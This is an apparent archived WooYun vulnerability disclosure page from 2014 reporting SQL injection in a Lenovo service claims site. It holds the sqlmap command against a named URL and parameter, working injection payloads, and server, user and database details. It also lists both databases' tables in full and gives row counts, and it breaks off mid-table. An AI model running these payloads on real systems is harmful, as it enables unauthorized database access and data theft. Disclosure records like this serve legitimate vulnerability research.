@@ -1,0 +1,864 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		联想某重要服务平台系统存在SQL注射导致信息泄露（多库）  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		联想某重要服务平台系统存在SQL注射导致信息泄露（多库）  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/Mr.leo">Mr.leo</a> 
+</li><li>提交时间：		2014-01-03 16:17</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2014-01-03：	细节已通知厂商并且等待厂商处理中<br/>
+									2014-01-03：	厂商已经确认，细节仅向厂商公开<br/>
+									2014-01-13：	细节向核心白帽子及相关领域专家公开<br/>
+									2014-01-23：	细节向普通白帽子公开<br/>
+									2014-02-02：	细节向实习白帽子公开<br/>
+									2014-02-17：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">联想#某重要服务平台系统存在SQL注射导致信息泄露（多库）</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">站点;<br />
+<br />
+<br />
+<br />
+http://claims.lenovo.com  联想服务平台系统<br />
+<br />
+<br />
+<br />
+由于网站没有设置robots.txt，导致被搜索引擎抓取<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/27173259d86fd0c75ea650ee9480eefacc60f27e.png" target="_blank"><img src="../images/27173259d86fd0c75ea650ee9480eefacc60f27e.png" alt="555555555555.png" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/2717334557ddbb59bcbb8e03e003ec9fea257667.png" target="_blank"><img src="../images/2717334557ddbb59bcbb8e03e003ec9fea257667.png" alt="777777777.png" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+ClaimId参数没有过滤，导致注射<br />
+<br />
+<br />
+<br />
+sqlmap跑起来<br />
+<br />
+<br />
+<br />
+</p><pre><code>Sqlmap -u &quot;http://claims.lenovo.com/Claim/PrintPartInformation.aspx?ClaimId=9990540964&amp;PartNumber=45N7321&amp;Notes&quot; --dbs --current-user --current-db<br />
+<br />
+Place: GET<br />
+Parameter: ClaimId<br />
+    Type: boolean-based blind<br />
+    Title: AND boolean-based blind - WHERE or HAVING clause<br />
+    Payload: ClaimId=9990540964&#039; AND 2958=2958 AND &#039;Pjcy&#039;=&#039;Pjcy&amp;PartNumber=45N73<br />
+21&amp;Notes<br />
+<br />
+    Type: error-based<br />
+    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause<br />
+    Payload: ClaimId=9990540964&#039; AND 9468=CONVERT(INT,(CHAR(58)+CHAR(115)+CHAR(1<br />
+01)+CHAR(118)+CHAR(58)+(SELECT (CASE WHEN (9468=9468) THEN CHAR(49) ELSE CHAR(48<br />
+) END))+CHAR(58)+CHAR(118)+CHAR(102)+CHAR(98)+CHAR(58))) AND &#039;whgb&#039;=&#039;whgb&amp;PartNu<br />
+mber=45N7321&amp;Notes<br />
+<br />
+    Type: UNION query<br />
+    Title: Generic UNION query (NULL) - 14 columns<br />
+    Payload: ClaimId=-4899&#039; UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL,<br />
+ NULL, CHAR(58)+CHAR(115)+CHAR(101)+CHAR(118)+CHAR(58)+CHAR(73)+CHAR(99)+CHAR(12<br />
+2)+CHAR(66)+CHAR(115)+CHAR(80)+CHAR(88)+CHAR(109)+CHAR(111)+CHAR(89)+CHAR(58)+CH<br />
+AR(118)+CHAR(102)+CHAR(98)+CHAR(58), NULL, NULL, NULL, NULL, NULL, NULL-- &amp;PartN<br />
+umber=45N7321&amp;Notes<br />
+<br />
+    Type: stacked queries<br />
+    Title: Microsoft SQL Server/Sybase stacked queries<br />
+    Payload: ClaimId=9990540964&#039;; WAITFOR DELAY &#039;0:0:5&#039;;--&amp;PartNumber=45N7321&amp;No<br />
+tes<br />
+<br />
+    Type: AND/OR time-based blind<br />
+    Title: Microsoft SQL Server/Sybase time-based blind<br />
+    Payload: ClaimId=9990540964&#039; WAITFOR DELAY &#039;0:0:5&#039;--&amp;PartNumber=45N7321&amp;Note<br />
+s<br />
+---<br />
+[17:34:45] [INFO] the back-end DBMS is Microsoft SQL Server<br />
+web server operating system: Windows 2008<br />
+web application technology: ASP.NET 4.0.30319, ASP.NET, Microsoft IIS 7.5<br />
+back-end DBMS: Microsoft SQL Server 2005<br />
+[17:34:45] [INFO] fetching current user<br />
+current user:    &#039;eclaim&#039;<br />
+[17:34:45] [INFO] fetching current database<br />
+current database:    &#039;Eclaim_p&#039;<br />
+[17:34:45] [INFO] fetching database names<br />
+[17:34:45] [INFO] the SQL query used returns 6 entries<br />
+[17:34:45] [INFO] resumed: &quot;Eclaim&quot;<br />
+[17:34:45] [INFO] resumed: &quot;Eclaim_p&quot;<br />
+[17:34:45] [INFO] resumed: &quot;master&quot;<br />
+[17:34:45] [INFO] resumed: &quot;model&quot;<br />
+[17:34:45] [INFO] resumed: &quot;msdb&quot;<br />
+[17:34:45] [INFO] resumed: &quot;tempdb&quot;<br />
+available databases [6]:<br />
+[*] Eclaim<br />
+[*] Eclaim_p<br />
+[*] master<br />
+[*] model<br />
+[*] msdb<br />
+[*] tempdb</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+<br />
+<br />
+当前库<br />
+<br />
+</p><pre><code>Database: Eclaim_p<br />
+[191 tables]<br />
++---------------------------------------------+<br />
+| dbo.BP_Customer                             |<br />
+| dbo.BP_Customer_Deleted                     |<br />
+| dbo.BP_Customer_Repeated                    |<br />
+| dbo.BP_Key_Customer                         |<br />
+| dbo.BP_Loc_Customer_Relation                |<br />
+| dbo.BP_Material_Vendor                      |<br />
+| dbo.BP_Mentorware_Oper_Log                  |<br />
+| dbo.BP_Org_AUSP                             |<br />
+| dbo.BP_Org_Technician                       |<br />
+| dbo.BP_Org_ZSDI                             |<br />
+| dbo.BP_Organization                         |<br />
+| dbo.BP_OrganizationProdLine                 |<br />
+| dbo.BP_Product                              |<br />
+| dbo.BP_RemitAddress                         |<br />
+| dbo.BP_ShipAddress                          |<br />
+| dbo.BP_Technician                           |<br />
+| dbo.BP_Technician_Certification             |<br />
+| dbo.BP_Technician_Ext                       |<br />
+| dbo.BP_Technician_RelayWare                 |<br />
+| dbo.BP_Technician_RelayWare_Error           |<br />
+| dbo.BP_Technician_RelayWare_Log             |<br />
+| dbo.BP_Technician_RelayWare_Temp            |<br />
+| dbo.BP_Technician_Training                  |<br />
+| dbo.BP_Technician_Training_BAK_20130522     |<br />
+| dbo.BP_VRU_EXTRACT                          |<br />
+| dbo.BP_Warranty                             |<br />
+| dbo.BP_Warranty_Deteled                     |<br />
+| dbo.BP_Warranty_SunTemp                     |<br />
+| dbo.BP_Warranty_SunTempError                |<br />
+| dbo.CL_Claim                                |<br />
+| dbo.CL_ClaimDetail                          |<br />
+| dbo.CL_ClaimDetail20130309bak               |<br />
+| dbo.CL_ClaimDetail_2011bak                  |<br />
+| dbo.CL_ClaimDetail_20130705_bak             |<br />
+| dbo.CL_ClaimDetail_20130707bak              |<br />
+| dbo.CL_ClaimDetail_Deleted                  |<br />
+| dbo.CL_ClaimDetail_Repeated                 |<br />
+| dbo.CL_ClaimFeedback                        |<br />
+| dbo.CL_ClaimFeedback20130309bak             |<br />
+| dbo.CL_ClaimFeedback_2011bak                |<br />
+| dbo.CL_ClaimPayment                         |<br />
+| dbo.CL_ClaimPayment_Deleted                 |<br />
+| dbo.CL_Claim_Deleted                        |<br />
+| dbo.CL_Claim_Repeated                       |<br />
+| dbo.CL_Condtemp                             |<br />
+| dbo.CL_PayCond                              |<br />
+| dbo.CL_PayCond20130306                      |<br />
+| dbo.CL_PayCond_Temp                         |<br />
+| dbo.CL_PayPricing                           |<br />
+| dbo.DI_BP_Customer                          |<br />
+| dbo.DI_BP_Customer_Temp                     |<br />
+| dbo.DI_BP_Warranty                          |<br />
+| dbo.DI_BP_Warranty_Temp                     |<br />
+| dbo.DI_CL_Claim                             |<br />
+| dbo.DI_CL_ClaimDetail                       |<br />
+| dbo.DI_CL_ClaimDetail_Temp                  |<br />
+| dbo.DI_CL_ClaimFeedback                     |<br />
+| dbo.DI_CL_ClaimFeedback_Temp                |<br />
+| dbo.DI_CL_ClaimPayment                      |<br />
+| dbo.DI_CL_ClaimPayment_Temp                 |<br />
+| dbo.DI_CL_Claim_Temp                        |<br />
+| dbo.DI_CRU_TIER_ORGDATA                     |<br />
+| dbo.DI_CRU_TIER_TEMP                        |<br />
+| dbo.DI_ECA                                  |<br />
+| dbo.DI_EClaimSYNC_FtpFileList               |<br />
+| dbo.DI_FRU_SUB                              |<br />
+| dbo.DI_FromSatmetrix                        |<br />
+| dbo.DI_FromSatmetrix_Temp                   |<br />
+| dbo.DI_MARA                                 |<br />
+| dbo.DI_MTFRU_ORGDATA                        |<br />
+| dbo.DI_MT_FRU                               |<br />
+| dbo.DI_MT_FRU_BAK_20130513                  |<br />
+| dbo.DI_MT_FRU_CRMINI                        |<br />
+| dbo.DI_MT_FRU_SingleTemp                    |<br />
+| dbo.DI_MT_FRU_SingleTemp_BAK20130529        |<br />
+| dbo.DI_MaterialGroup                        |<br />
+| dbo.DI_MaterialGroup_temp                   |<br />
+| dbo.DI_Material_Info                        |<br />
+| dbo.DI_PART_WTY                             |<br />
+| dbo.DI_PPN_FRU                              |<br />
+| dbo.DI_PPN_FRU_SingleTemp                   |<br />
+| dbo.DI_SCRE_INI                             |<br />
+| dbo.DI_ToStatmetrix                         |<br />
+| dbo.DI_ToStatmetrix_temp                    |<br />
+| dbo.DI_TrainingCourse                       |<br />
+| dbo.DI_UPR                                  |<br />
+| dbo.DI_UPR_CPPS                             |<br />
+| dbo.DI_UPR_ORGDATA                          |<br />
+| dbo.DI_UPR_PIMS                             |<br />
+| dbo.DI_UPR_WSTN                             |<br />
+| dbo.DI_VRU_EXTRACT                          |<br />
+| dbo.DI_VRU_EXTRACT_temp                     |<br />
+| dbo.DI_VRU_FILELOG                          |<br />
+| dbo.ErrorLog                                |<br />
+| dbo.FTP_Service_ErrorLog                    |<br />
+| dbo.FTP_Service_ExcuteLog                   |<br />
+| dbo.HTK_Report_DataFromMTM                  |<br />
+| dbo.HTK_Report_DataFromMTM_TEMP             |<br />
+| dbo.HTK_Report_DataFromMTMbak               |<br />
+| dbo.INI_MARA_PRODH                          |<br />
+| dbo.INI_maktx                               |<br />
+| dbo.Internaluser_cuisy                      |<br />
+| dbo.LOG_DTS_IBASE                           |<br />
+| dbo.L_UserID_Role                           |<br />
+| dbo.L_UserID_Role_NULL                      |<br />
+| dbo.LogTable                                |<br />
+| dbo.MTFRU_SINGLE20110506                    |<br />
+| dbo.MTFRU_SINGLE20110507                    |<br />
+| dbo.MTFRU_SINGLE20110508                    |<br />
+| dbo.MTFRU_SINGLE20110510                    |<br />
+| dbo.SCORECARD_REPORT                        |<br />
+| dbo.SDF                                     |<br />
+| dbo.SERVICE_CODE                            |<br />
+| dbo.SERVICE_CODE_BAK_20131126               |<br />
+| dbo.SERVICE_MACHINE_SDF                     |<br />
+| dbo.SERVICE_SDF                             |<br />
+| dbo.SERVICE_SDF_BAK_20131126                |<br />
+| dbo.SERVICE_SPLIT_SDF                       |<br />
+| dbo.SY_Action                               |<br />
+| dbo.SY_Certification                        |<br />
+| dbo.SY_CondType                             |<br />
+| dbo.SY_Course                               |<br />
+| dbo.SY_Enterprise                           |<br />
+| dbo.SY_InternalRole                         |<br />
+| dbo.SY_InternalRole_MEMBER                  |<br />
+| dbo.SY_InternalRole_PageBtn                 |<br />
+| dbo.SY_LOGIN_Failure_LOG                    |<br />
+| dbo.SY_LOGIN_LOG                            |<br />
+| dbo.SY_MarktingAttribut                     |<br />
+| dbo.SY_PARAMS                               |<br />
+| dbo.SY_PRIVILEGE                            |<br />
+| dbo.SY_PRIVILEGE_backup                     |<br />
+| dbo.SY_PRIVILEGE_phase1                     |<br />
+| dbo.SY_PageBtn                              |<br />
+| dbo.SY_Privile_User                         |<br />
+| dbo.SY_Privile_User_BAK_2013051             |<br />
+| dbo.SY_ProdLine                             |<br />
+| dbo.SY_ROLE                                 |<br />
+| dbo.SY_ROLE_MEMBER                          |<br />
+| dbo.SY_ROLE_MEMBER_bak                      |<br />
+| dbo.SY_ROLE_PRIVILEGE                       |<br />
+| dbo.SY_ROLE_PRIVILEGE_1a                    |<br />
+| dbo.SY_ROLE_PRIVILEGE_phase1                |<br />
+| dbo.SY_SEQ                                  |<br />
+| dbo.SY_SERVICES_RELATION                    |<br />
+| dbo.SY_State                                |<br />
+| dbo.SY_User_LoginError_Count                |<br />
+| dbo.SY_User_Org                             |<br />
+| dbo.SY_User_PasswordReset_Log               |<br />
+| dbo.SY_VALUE                                |<br />
+| dbo.SY_VALUE_bak_20130424                   |<br />
+| dbo.SY_Vendor                               |<br />
+| dbo.SY_Vendor_Payment                       |<br />
+| dbo.SY_Vendor_Prodline                      |<br />
+| dbo.SY_Vendor_Prodline_test                 |<br />
+| dbo.SY_role_PRIVILEGE_backup                |<br />
+| dbo.SY_role_PRIVILEGE_bak                   |<br />
+| dbo.TS_I_002_A_B                            |<br />
+| dbo.TS_I_002_A_B_TEMP                       |<br />
+| dbo.Think_Machine_Sequence                  |<br />
+| dbo.UPR_0321                                |<br />
+| dbo.User_Role$_yy                           |<br />
+| dbo.VW_Account                              |<br />
+| dbo.VW_SERVICE_MACHINE_SDF                  |<br />
+| dbo.[SSIS Configurations]                   |<br />
+| dbo.bp_qual_condi                           |<br />
+| dbo.di_mt_fru_temp                          |<br />
+| dbo.di_ppn_fru_crmini                       |<br />
+| dbo.di_ppn_fru_temp                         |<br />
+| dbo.di_ppn_fru_upload                       |<br />
+| dbo.di_trainingcourse_temp                  |<br />
+| dbo.di_upr_random                           |<br />
+| dbo.duplicate_claims                        |<br />
+| dbo.internal_user                           |<br />
+| dbo.internal_user_name                      |<br />
+| dbo.internaluser_bp                         |<br />
+| dbo.lidane_monitor                          |<br />
+| dbo.monitor_0329                            |<br />
+| dbo.mt_fru_update                           |<br />
+| dbo.sy_modify_log                           |<br />
+| dbo.sy_privilege_forphase2                  |<br />
+| dbo.sy_value_bak                            |<br />
+| dbo.sysdiagrams                             |<br />
+| dbo.think_packing_machine_material_20060101 |<br />
+| dbo.think_packing_machine_material_20070101 |<br />
+| dbo.think_packing_machine_material_20080101 |<br />
+| dbo.think_packing_machine_material_20090101 |<br />
+| dbo.think_packing_machine_material_20100101 |<br />
+| dbo.think_packing_machine_material_20110101 |<br />
+| dbo.vw_think_packing_machine_material       |<br />
+| dbo.yy_US_UPR_INI                           |<br />
++---------------------------------------------+<br />
+<br />
+另外1个库<br />
+Database: Eclaim<br />
+[293 tables]<br />
++---------------------------------------------+<br />
+| dbo.BP_Customer                             |<br />
+| dbo.BP_Material_Vendor                      |<br />
+| dbo.BP_Org_AUSP                             |<br />
+| dbo.BP_Org_AUSP_SunBak                      |<br />
+| dbo.BP_Org_Technician                       |<br />
+| dbo.BP_Organization                         |<br />
+| dbo.BP_OrganizationProdLine                 |<br />
+| dbo.BP_Product                              |<br />
+| dbo.BP_RemitAddress                         |<br />
+| dbo.BP_ShipAddress                          |<br />
+| dbo.BP_Technician                           |<br />
+| dbo.BP_Technician_Certification             |<br />
+| dbo.BP_Technician_Ext                       |<br />
+| dbo.BP_Technician_Training                  |<br />
+| dbo.BP_VRU_EXTRACT                          |<br />
+| dbo.BP_Warranty                             |<br />
+| dbo.CL_Claim                                |<br />
+| dbo.CL_ClaimDetail                          |<br />
+| dbo.CL_ClaimFeedback                        |<br />
+| dbo.CL_ClaimFeedback_20110322               |<br />
+| dbo.CL_ClaimFeedback_bak0327                |<br />
+| dbo.CL_ClaimPayment                         |<br />
+| dbo.CL_PayCond                              |<br />
+| dbo.CL_PayPricing                           |<br />
+| dbo.CUISY_VALUE                             |<br />
+| dbo.DI_ECA                                  |<br />
+| dbo.DI_FRU_SUB                              |<br />
+| dbo.DI_FromSatmetrix                        |<br />
+| dbo.DI_FromSatmetrix_Temp                   |<br />
+| dbo.DI_MARA                                 |<br />
+| dbo.DI_MT_FRU                               |<br />
+| dbo.DI_MT_FRU_CRMINI                        |<br />
+| dbo.DI_Material_Info                        |<br />
+| dbo.DI_PART_WTY                             |<br />
+| dbo.DI_PPN_FRU                              |<br />
+| dbo.DI_SCRE_INI                             |<br />
+| dbo.DI_ToStatmetrix                         |<br />
+| dbo.DI_ToStatmetrix_temp                    |<br />
+| dbo.DI_TrainingCourse                       |<br />
+| dbo.FTP_Service_ErrorLog                    |<br />
+| dbo.FTP_Service_ExcuteLog                   |<br />
+| dbo.HTK_Report_DataFromMTM                  |<br />
+| dbo.HTK_Report_DataFromMTM_TEMP             |<br />
+| dbo.HTK_Report_DataFromMTMbak               |<br />
+| dbo.LOG_DTS_IBASE                           |<br />
+| dbo.PMAMAP                                  |<br />
+| dbo.PMARTF                                  |<br />
+| dbo.PMATTR                                  |<br />
+| dbo.PMBMAP                                  |<br />
+| dbo.PMBPMDAAC                               |<br />
+| dbo.PMBPMDATA                               |<br />
+| dbo.PMBPMDCSN                               |<br />
+| dbo.PMBPMDTRS                               |<br />
+| dbo.PMBPMENDS                               |<br />
+| dbo.PMBPMEVNT                               |<br />
+| dbo.PMBPMFLOW                               |<br />
+| dbo.PMBPMFRMT                               |<br />
+| dbo.PMBPMMSPT                               |<br />
+| dbo.PMBPMOPER                               |<br />
+| dbo.PMBPMPROC                               |<br />
+| dbo.PMBPMPRVD                               |<br />
+| dbo.PMBPMRFLW                               |<br />
+| dbo.PMBPMRSRC                               |<br />
+| dbo.PMBPMS                                  |<br />
+| dbo.PMBPMSYNC                               |<br />
+| dbo.PMBPMVARB                               |<br />
+| dbo.PMBRNC                                  |<br />
+| dbo.PMCDMASSC                               |<br />
+| dbo.PMCDMDTSC                               |<br />
+| dbo.PMCDMENTT                               |<br />
+| dbo.PMCDMINHR                               |<br />
+| dbo.PMCDMLINK                               |<br />
+| dbo.PMCDMPROP                               |<br />
+| dbo.PMCDMRLSH                               |<br />
+| dbo.PMCHCK                                  |<br />
+| dbo.PMCLSS                                  |<br />
+| dbo.PMCMAP                                  |<br />
+| dbo.PMCNFG                                  |<br />
+| dbo.PMCONT                                  |<br />
+| dbo.PMDBMS                                  |<br />
+| dbo.PMDFLT                                  |<br />
+| dbo.PMDIAG                                  |<br />
+| dbo.PMDTSC                                  |<br />
+| dbo.PMDVTL                                  |<br />
+| dbo.PMEMDL                                  |<br />
+| dbo.PMEOBJ                                  |<br />
+| dbo.PMEXAS                                  |<br />
+| dbo.PMFILO                                  |<br />
+| dbo.PMFLDR                                  |<br />
+| dbo.PMGUSR                                  |<br />
+| dbo.PMILMACOL                               |<br />
+| dbo.PMILMARTC                               |<br />
+| dbo.PMILMBPRC                               |<br />
+| dbo.PMILMCCDB                               |<br />
+| dbo.PMILMDAAP                               |<br />
+| dbo.PMILMDALN                               |<br />
+| dbo.PMILMDBIN                               |<br />
+| dbo.PMILMDBOU                               |<br />
+| dbo.PMILMDCNT                               |<br />
+| dbo.PMILMDSCL                               |<br />
+| dbo.PMILMDSJN                               |<br />
+| dbo.PMILMDTBS                               |<br />
+| dbo.PMILMDTCL                               |<br />
+| dbo.PMILMDTFL                               |<br />
+| dbo.PMILMDTLU                               |<br />
+| dbo.PMILMDTQE                               |<br />
+| dbo.PMILMEVSC                               |<br />
+| dbo.PMILMFFIL                               |<br />
+| dbo.PMILMFFOU                               |<br />
+| dbo.PMILMGDOU                               |<br />
+| dbo.PMILMGLNK                               |<br />
+| dbo.PMILMPCKG                               |<br />
+| dbo.PMILMPRMT                               |<br />
+| dbo.PMILMPROC                               |<br />
+| dbo.PMILMPUBL                               |<br />
+| dbo.PMILMRPRC                               |<br />
+| dbo.PMILMSCEX                               |<br />
+| dbo.PMILMSCOL                               |<br />
+| dbo.PMILMSUBS                               |<br />
+| dbo.PMILMTPRC                               |<br />
+| dbo.PMILMTREN                               |<br />
+| dbo.PMILMXDOC                               |<br />
+| dbo.PMILMXMOU                               |<br />
+| dbo.PMLATT                                  |<br />
+| dbo.PMLBIN                                  |<br />
+| dbo.PMLIBR                                  |<br />
+| dbo.PMLOCK                                  |<br />
+| dbo.PMLRRS                                  |<br />
+| dbo.PMLSRP                                  |<br />
+| dbo.PMOBJT                                  |<br />
+| dbo.PMOCNF                                  |<br />
+| dbo.PMOLOG                                  |<br />
+| dbo.PMOOMACTN                               |<br />
+| dbo.PMOOMACTV                               |<br />
+| dbo.PMOOMANOT                               |<br />
+| dbo.PMOOMASSC                               |<br />
+| dbo.PMOOMATVL                               |<br />
+| dbo.PMOOMCLNK                               |<br />
+| dbo.PMOOMCMPI                               |<br />
+| dbo.PMOOMCOMP                               |<br />
+| dbo.PMOOMCSFR                               |<br />
+| dbo.PMOOMDCSN                               |<br />
+| dbo.PMOOMDTSC                               |<br />
+| dbo.PMOOMENDS                               |<br />
+| dbo.PMOOMGNRL                               |<br />
+| dbo.PMOOMIACT                               |<br />
+| dbo.PMOOMIAPM                               |<br />
+| dbo.PMOOMIFRG                               |<br />
+| dbo.PMOOMILNK                               |<br />
+| dbo.PMOOMIREF                               |<br />
+| dbo.PMOOMMSSG                               |<br />
+| dbo.PMOOMMTHD                               |<br />
+| dbo.PMOOMOAPM                               |<br />
+| dbo.PMOOMOBJT                               |<br />
+| dbo.PMOOMOBST                               |<br />
+| dbo.PMOOMPARM                               |<br />
+| dbo.PMOOMPART                               |<br />
+| dbo.PMOOMPORT                               |<br />
+| dbo.PMOOMSTAT                               |<br />
+| dbo.PMOOMSYNC                               |<br />
+| dbo.PMOOMTPRM                               |<br />
+| dbo.PMOOMTPRV                               |<br />
+| dbo.PMOOMVARB                               |<br />
+| dbo.PMOPTS                                  |<br />
+| dbo.PMPCTF                                  |<br />
+| dbo.PMPDMABDT                               |<br />
+| dbo.PMPDMADPR                               |<br />
+| dbo.PMPDMCIDX                               |<br />
+| dbo.PMPDMDBPK                               |<br />
+| dbo.PMPDMDTBS                               |<br />
+| dbo.PMPDMGRPE                               |<br />
+| dbo.PMPDMINDX                               |<br />
+| dbo.PMPDMJIDX                               |<br />
+| dbo.PMPDMMEAS                               |<br />
+| dbo.PMPDMNMSP                               |<br />
+| dbo.PMPDMPARM                               |<br />
+| dbo.PMPDMPERM                               |<br />
+| dbo.PMPDMPKCU                               |<br />
+| dbo.PMPDMPKEX                               |<br />
+| dbo.PMPDMPKPR                               |<br />
+| dbo.PMPDMPKTY                               |<br />
+| dbo.PMPDMPKVA                               |<br />
+| dbo.PMPDMPRCT                               |<br />
+| dbo.PMPDMPROC                               |<br />
+| dbo.PMPDMPROF                               |<br />
+| dbo.PMPDMREFR                               |<br />
+| dbo.PMPDMROLE                               |<br />
+| dbo.PMPDMRSCL                               |<br />
+| dbo.PMPDMSQNC                               |<br />
+| dbo.PMPDMSYNM                               |<br />
+| dbo.PMPDMTABL                               |<br />
+| dbo.PMPDMTKEY                               |<br />
+| dbo.PMPDMTRGI                               |<br />
+| dbo.PMPDMTRGR                               |<br />
+| dbo.PMPDMTRGT                               |<br />
+| dbo.PMPDMUSER                               |<br />
+| dbo.PMPDMVIDX                               |<br />
+| dbo.PMPDMVIEW                               |<br />
+| dbo.PMPDMVIWC                               |<br />
+| dbo.PMPDMVREF                               |<br />
+| dbo.PMPDMWPRM                               |<br />
+| dbo.PMPDMWSOP                               |<br />
+| dbo.PMPDMWSRV                               |<br />
+| dbo.PMPERM                                  |<br />
+| dbo.PMPSEL                                  |<br />
+| dbo.PMPSLM                                  |<br />
+| dbo.PMREPL                                  |<br />
+| dbo.PMRLSH                                  |<br />
+| dbo.PMRLTN                                  |<br />
+| dbo.PMRLTX                                  |<br />
+| dbo.PMRMAP                                  |<br />
+| dbo.PMRPLG                                  |<br />
+| dbo.PMRPRT                                  |<br />
+| dbo.PMRQMGRPE                               |<br />
+| dbo.PMRQMRQMT                               |<br />
+| dbo.PMRQMTLNK                               |<br />
+| dbo.PMRQMUSER                               |<br />
+| dbo.PMRQMUSRA                               |<br />
+| dbo.PMRULE                                  |<br />
+| dbo.PMSEQN                                  |<br />
+| dbo.PMSMAP                                  |<br />
+| dbo.PMSRPL                                  |<br />
+| dbo.PMSTNG                                  |<br />
+| dbo.PMTEMP                                  |<br />
+| dbo.PMTEXT                                  |<br />
+| dbo.PMTMP2                                  |<br />
+| dbo.PMTRFM                                  |<br />
+| dbo.PMTRFS                                  |<br />
+| dbo.PMTRFT                                  |<br />
+| dbo.PMUSER                                  |<br />
+| dbo.PMXDOC                                  |<br />
+| dbo.PMXFIL                                  |<br />
+| dbo.PMXNSP                                  |<br />
+| dbo.PMXSMAITM                               |<br />
+| dbo.PMXSMANNT                               |<br />
+| dbo.PMXSMCMAP                               |<br />
+| dbo.PMXSMCMPT                               |<br />
+| dbo.PMXSMDTSC                               |<br />
+| dbo.PMXSMENTT                               |<br />
+| dbo.PMXSMLANG                               |<br />
+| dbo.PMXSMXTRN                               |<br />
+| dbo.SDF                                     |<br />
+| dbo.SERVICE_CODE                            |<br />
+| dbo.SERVICE_MACHINE_SDF                     |<br />
+| dbo.SERVICE_SDF                             |<br />
+| dbo.SERVICE_SPLIT_SDF                       |<br />
+| dbo.SY_Certification                        |<br />
+| dbo.SY_CondType                             |<br />
+| dbo.SY_Course                               |<br />
+| dbo.SY_Enterprise                           |<br />
+| dbo.SY_InternalRole                         |<br />
+| dbo.SY_InternalRole_MEMBER                  |<br />
+| dbo.SY_InternalRole_PageBtn                 |<br />
+| dbo.SY_LOGIN_LOG                            |<br />
+| dbo.SY_MarktingAttribut                     |<br />
+| dbo.SY_PARAMS                               |<br />
+| dbo.SY_PRIVILEGE                            |<br />
+| dbo.SY_PageBtn                              |<br />
+| dbo.SY_Privile_User                         |<br />
+| dbo.SY_ProdLine                             |<br />
+| dbo.SY_ROLE                                 |<br />
+| dbo.SY_ROLE_MEMBER                          |<br />
+| dbo.SY_ROLE_PRIVILEGE                       |<br />
+| dbo.SY_SEQ                                  |<br />
+| dbo.SY_SERVICES_RELATION                    |<br />
+| dbo.SY_State                                |<br />
+| dbo.SY_User_Org                             |<br />
+| dbo.SY_VALUE                                |<br />
+| dbo.SY_Vendor                               |<br />
+| dbo.SY_Vendor_Payment                       |<br />
+| dbo.SY_Vendor_Prodline                      |<br />
+| dbo.TEMP_CUISY_2011                         |<br />
+| dbo.TEMP_CUISY_VALUE                        |<br />
+| dbo.Think_Machine_Sequence                  |<br />
+| dbo.VW_Account                              |<br />
+| dbo.VW_SERVICE_MACHINE_SDF                  |<br />
+| dbo.ZSDI_EDI_ORD_QLF_cuisy2                 |<br />
+| dbo.bp_qual_condi                           |<br />
+| dbo.bp_warranty_bak20110406                 |<br />
+| dbo.cuisy_feedback0323                      |<br />
+| dbo.di_mt_fru_temp                          |<br />
+| dbo.di_ppn_fru_crmini                       |<br />
+| dbo.di_ppn_fru_temp                         |<br />
+| dbo.di_trainingcourse_temp                  |<br />
+| dbo.sy_modify_log                           |<br />
+| dbo.sy_value_bak                            |<br />
+| dbo.think_packing_machine_material_20060101 |<br />
+| dbo.think_packing_machine_material_20070101 |<br />
+| dbo.think_packing_machine_material_20080101 |<br />
+| dbo.think_packing_machine_material_20090101 |<br />
+| dbo.think_packing_machine_material_20100101 |<br />
+| dbo.think_packing_machine_material_20110101 |<br />
+| dbo.vw_think_packing_machine_material       |<br />
++---------------------------------------------+<br />
+<br />
+数据量也很大<br />
+<br />
+Database: Eclaim<br />
++---------------------------------+---------+<br />
+| Table                           | Entries |<br />
++---------------------------------+---------+<br />
+| dbo.DI_MT_FRU                   | 2994159 |<br />
+| dbo.DI_MT_FRU_CRMINI            | 2990927 |<br />
+| dbo.DI_Material_Info            | 1702212 |<br />
+| dbo.HTK_Report_DataFromMTM      | 1687041 |<br />
+| dbo.HTK_Report_DataFromMTM_TEMP | 659157  |<br />
+| dbo.di_ppn_fru_temp             | 289516  |<br />
+| dbo.DI_MARA                     | 281838  |<br />
+| dbo.CL_ClaimFeedback_bak0327    | 229296  |<br />
+| dbo.BP_Technician_Ext           | 135492  |<br />
+| dbo.DI_PPN_FRU                  | 128172  |<br />
+| dbo.di_ppn_fru_crmini           | 127756  |<br />
+| dbo.BP_Customer                 | 94962   |<br />
+| dbo.BP_Org_Technician           | 63109   |<br />
+| dbo.DI_SCRE_INI                 | 61180   |<br />
+| dbo.HTK_Report_DataFromMTMbak   | 50000   |<br />
+| dbo.BP_Org_AUSP_SunBak          | 38112   |<br />
+| dbo.BP_Org_AUSP                 | 37758   |<br />
+| dbo.BP_Technician_Training      | 27263   |<br />
+| dbo.BP_Technician               | 19400   |<br />
+| dbo.SY_ROLE_MEMBER              | 14085   |<br />
+| dbo.DI_FromSatmetrix_Temp       | 11430   |<br />
+| dbo.DI_FromSatmetrix            | 11390   |<br />
+| dbo.BP_OrganizationProdLine     | 9564    |<br />
+| dbo.SY_LOGIN_LOG                | 9351    |<br />
+| dbo.sy_modify_log               | 7001    |<br />
+| dbo.cuisy_feedback0323          | 6853    |<br />
+| dbo.ZSDI_EDI_ORD_QLF_cuisy2     | 6621    |<br />
+| dbo.DI_FRU_SUB                  | 5660    |<br />
+| dbo.CL_ClaimDetail              | 4876    |<br />
+| dbo.SY_User_Org                 | 4483    |<br />
+| dbo.BP_Technician_Certification | 4109    |<br />
+| dbo.PMRLTX                      | 3352    |<br />
+| dbo.SY_Privile_User             | 3151    |<br />
+| dbo.VW_Account                  | 3151    |<br />
